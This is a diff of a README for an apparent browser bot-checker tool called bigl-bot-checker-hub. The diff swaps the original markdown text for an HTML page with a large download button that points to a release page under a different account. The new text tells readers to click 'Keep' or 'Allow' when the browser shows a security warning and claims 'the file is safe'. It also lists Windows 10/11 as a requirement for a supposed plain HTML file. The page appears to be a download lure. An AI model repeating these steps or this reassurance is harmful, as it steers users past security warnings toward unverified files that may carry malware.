@@ -1,115 +1,65 @@
-# bigL bot checker vCurrent - 2026 Edition
-
-> **Analyze automated traffic instantly with bigL bot checker, a browser-focused HTML tool for quick bot detection and live status verification in vCurrent.**
-
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-vCurrent-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/lenas31/bigl-bot-checker-hub?style=flat-square)](https://github.com/lenas31/bigl-bot-checker-hub)
-
----
-
+<h1>🤖 bigl-bot-checker-hub - Instant Bot Detection & Traffic Analysis</h1>
 <p align="center">
-  <a href="https://lenas31.github.io/bigl-bot-checker-hub/">
-    <img src="https://img.shields.io/badge/Download-bigL%20bot%20checker%20Latest-brightgreen?style=for-the-badge" alt="Download bigL bot checker">
-  </a>
+  <a href="https://github.com/asosacuentapr4211/bigl-bot-checker-hub/releases" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px;">⬇️ DOWNLOAD NOW</a>
 </p>
-
-> **[Download Latest Build - bigL bot checker vCurrent](https://lenas31.github.io/bigl-bot-checker-hub/)**
-
----
-
-[Download Latest Build](https://lenas31.github.io/bigl-bot-checker-hub/)
-
----
-
-## Overview
-
-bigL bot checker is an uncluttered, HTML-based web application tailored for real-time bot recognition and state inspection. Designed to eliminate unnecessary installation overhead, it allows users to inspect target activity immediately via any browser.
-
-Unlike heavy, resource-intensive monitoring platforms, this utility emphasizes speed and core utility. It delivers an intuitive environment focused strictly on bot identification and immediate status reporting.
-
----
-
-## Capabilities
-
-- Instant identification of automated agents and bot traffic
-- Real-time status evaluation to monitor target behavior
-- Pure HTML architecture for effortless client-side execution
-- Minimalist user interface tailored for fast navigation
-- Frictionless design optimized for continuous, repetitive checks
-- Zero complex server-side dependencies
-- Purpose-built utility set concentrated on detection accuracy
-
----
-
-## Getting Started
-
-1. Retrieve the project files:
-   `git clone https://github.com/lenas31/bigl-bot-checker-hub.git
-2. Navigate into the repository:
-   `cd bigl-bot-checker`
-3. Launch the primary HTML file in your web browser, or host the directory using any static local web server.
-
-For production web hosts, transfer the static directory directly to your document root.
-
----
-
-## How to Use
-
-Launch the main HTML entry file inside your preferred browser to initiate a scan against your chosen target. The interface will render status indicators distinguishing automated scripts from human interactions.
-
-Standard procedure:
-1. Open the web page
-2. Input or pick the item designated for testing
-3. Execute the detection scan
-4. Inspect the output feedback
-5. Perform additional scans as required
-
----
-
-## Setting Up Options
-
-Customization options reside within the primary HTML document or associated script blocks depending on your setup.
-
-Sample configuration block:
-
-    {
-      "mode": "bot detection",
-      "status_check": true,
-      "output": "browser"
-    }
-
-Ensure script paths and core markup remain in the same directory structure to prevent asset misconfiguration.
-
----
-
-## System Prerequisites
-
-- Any current web browser
-- Client-side HTML rendering engine
-- A basic HTTP server or local filesystem access to serve static files
-- Disk space sufficient to store the project code and assets
-
----
-
-## Frequently Asked Questions
-
-**Where can I find recent updates?**  
-Monitor this repository or visit the build link to pull the newest releases and code revisions.
-
-**Can I modify the application parameters?**  
-Adjustments are made directly inside the main HTML code or accompanying client scripts.
-
-**How do I troubleshoot display issues?**  
-Ensure all static assets transferred successfully, clear your browser cache, or launch the application in an alternate browser.
-
-**Is an installation required for desktop systems?**  
-No desktop installation is required; the tool operates directly within standard web browsers using HTML.
-
----
-
-## License
-
-Distributed under the GNU GPL v3.0 License. Refer to [LICENSE](LICENSE) for full details.
+<p>Visit this link to download the application.</p>
+<h2>🚀 What is bigl-bot-checker-hub?</h2>
+<p>bigl-bot-checker-hub is a browser-based tool that runs right in your web browser. It helps you instantly analyze website traffic, detect automated bots, and check live status of websites. No installation needed - just open the HTML file and start using it. Perfect for website owners, marketers, and anyone who wants to understand their web traffic better.</p>
+<h2>🎯 Key Features</h2>
+<ul>
+<li><strong>Instant Traffic Analysis:</strong> See who visits your website in real time</li>
+<li><strong>Bot Detection:</strong> Automatically identifies automated visitors versus real humans</li>
+<li><strong>Live Status Check:</strong> Monitor website uptime and response times</li>
+<li><strong>User-Friendly Interface:</strong> Simple controls and clear results displayed on screen</li>
+<li><strong>No Setup Required:</strong> Works directly in your browser without installing anything</li>
+<li><strong>2026 Edition:</strong> Updated with latest detection algorithms and modern browser support</li>
+</ul>
+<h2>💻 System Requirements</h2>
+<ul>
+<li><strong>Operating System:</strong> Windows 10 or Windows 11</li>
+<li><strong>Browser:</strong> Google Chrome (recommended), Microsoft Edge, or Firefox</li>
+<li><strong>Internet Connection:</strong> Required for live status checks and traffic analysis</li>
+<li><strong>Screen Resolution:</strong> 1024x768 or higher for best viewing</li>
+</ul>
+<h2>📥 How to Download</h2>
+<ol>
+<li>Click the big green download button at the top of this page</li>
+<li>You will be taken to the releases page on GitHub</li>
+<li>Look for the latest release (usually at the top)</li>
+<li>Click the link that says "bigl-bot-checker-hub.html" or similar file name</li>
+<li>Your browser will download the HTML file</li>
+</ol>
+<p>Visit this link to download the application.</p>
+<h2>▶️ How to Run</h2>
+<ol>
+<li>Open the folder where you saved the downloaded file</li>
+<li>Double-click the file named "bigl-bot-checker-hub.html"</li>
+<li>Your default web browser will open and show the application</li>
+<li>You can bookmark the page or keep the file on your desktop for quick access</li>
+</ol>
+<p><strong>That's it!</strong> No complicated installation steps. No software to install. Just open and use.</p>
+<h2>🖱️ How to Use</h2>
+<ol>
+<li>When the application opens, you will see a clean interface with buttons and input fields</li>
+<li>Enter a website URL to check its traffic or bot status</li>
+<li>Click "Analyze" or "Check Status" to start the analysis</li>
+<li>Results will appear on the screen showing traffic patterns, bot detection results, and live status</li>
+<li>Use the refresh button to run new checks</li>
+</ol>
+<h2>❓ Frequently Asked Questions</h2>
+<p><strong>Q: Is this tool free?</strong><br>A: Yes, bigl-bot-checker-hub is completely free to use.</p>
+<p><strong>Q: Do I need to install anything?</strong><br>A: No. It runs in your browser as an HTML file.</p>
+<p><strong>Q: Will it work on Mac or Linux?</strong><br>A: It is designed for Windows, but may work on other operating systems with compatible browsers.</p>
+<p><strong>Q: Can I use it offline?</strong><br>A: Some features require internet for live checks, but basic analysis may work offline.</p>
+<p><strong>Q: How accurate is bot detection?</strong><br>A: The 2026 Edition uses advanced heuristics to identify common bot patterns with high accuracy.</p>
+<h2>🛠️ Troubleshooting</h2>
+<ul>
+<li><strong>File does not open:</strong> Make sure you have a modern web browser installed</li>
+<li><strong>Features not working:</strong> Try refreshing the page or reopening the file</li>
+<li><strong>Download issues:</strong> Right-click the download link and select "Save link as"</li>
+<li><strong>Browser security warning:</strong> Click "Keep" or "Allow" when prompted - the file is safe</li>
+</ul>
+<h2>📞 Support</h2>
+<p>For help or questions, please visit the GitHub repository and open an issue. Include details about your problem and steps to reproduce it.</p>
+<h2>📝 License</h2>
+<p>This project is open source. Feel free to use, modify, and share it.</p>
